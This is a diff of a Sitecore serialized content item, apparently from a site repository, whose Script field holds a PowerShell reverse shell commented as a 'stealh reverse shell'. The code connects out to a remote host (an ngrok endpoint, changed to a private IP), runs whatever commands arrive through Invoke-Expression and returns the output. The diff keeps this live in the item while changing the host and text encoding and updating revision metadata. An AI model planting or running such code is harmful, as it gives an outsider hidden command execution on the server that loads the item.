@@ -7,20 +7,22 @@ SharedFields:
 - ID: "b1a94ff0-6897-47c0-9c51-aa6acb80b1f0"
   Hint: Script
   Value: |
-    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("4.tcp.eu.ngrok.io", 16114);
+    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("{172.23.169.33", 9005);
     $reverseShellStream = $reverseShellClient.GetStream();
-    # Generate a stealh reverse shell
+    # Generate a stealh reverse shell    
     [byte[]]$reverseShellBytes = 0..65535|%{0};
     while(($i = $reverseShellStream.Read($reverseShellBytes, 0, $reverseShellBytes.Length)) -ne 0)
     {
-        $reverseShellCommand = (New-Object -TypeName System.Text.UTF8Encoding).GetString($reverseShellBytes,0, $i);
+        $reverseShellCommand = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($reverseShellBytes,0, $i);
         $reverseShellOutput = (Invoke-Expression -Command $reverseShellCommand 2>&1 | Out-String );
         $reverseShellOutput2  = $reverseShellOutput + 'PS ' + (Get-Location).Path + '> ';
-        $reverseShellOutputBytes = ([text.encoding]::UTF8).GetBytes($reverseShellOutput2);
+        $reverseShellOutputBytes = ([text.encoding]::ASCII).GetBytes($reverseShellOutput2);
         $reverseShellStream.Write($reverseShellOutputBytes,0,$reverseShellOutputBytes.Length);
         $reverseShellStream.Flush();
     }
     $reverseShellClient.Close();
+    
+    
     
 Languages:
 - Language: en
@@ -40,11 +42,11 @@ Languages:
         sitecore\bas.lijten@gmail.com
     - ID: "8cdc337e-a112-42fb-bbb4-4143751e123f"
       Hint: __Revision
-      Value: "5fc0e7e5-62c7-4ff1-95dd-e343127ba54c"
+      Value: "4968c8af-0bc6-4692-b7d8-bd44ab13a62a"
     - ID: "badd9cf9-53e0-4d0c-bcc0-2d784c282f6a"
       Hint: __Updated by
       Value: |
         sitecore\bas.lijten@gmail.com
     - ID: "d9cf14b1-fa16-4ba6-9288-e8a174d4d522"
       Hint: __Updated
-      Value: 20230614T153451Z
+      Value: 20230618T193608Z
